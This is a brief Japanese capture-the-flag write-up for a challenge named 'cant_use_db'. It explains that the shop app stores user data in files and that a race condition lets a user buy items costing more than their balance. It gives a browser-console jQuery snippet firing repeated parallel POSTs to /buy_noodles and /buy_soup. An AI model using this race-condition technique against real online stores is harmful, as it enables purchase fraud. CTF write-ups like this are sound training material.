# cant_use_db - Writeup

ユーザ情報はファイル管理のようだ。  
所持金以上のものを買うサイトから見てもrace conditionを狙う。  
ソースを見ると購入処理で`/buy_noodles`、`/buy_soup`へPOSTを投げているようだ。  
並列にPOSTを投げてやればよい。  
ブラウザコンソールで以下を実行してもよい。  
```javascript
$.post('/buy_noodles');
$.post('/buy_soup');
$.post('/buy_noodles');
$.post('/buy_soup');
$.post('/buy_noodles');
$.post('/buy_soup');
$.post('/buy_noodles');
$.post('/buy_soup');
```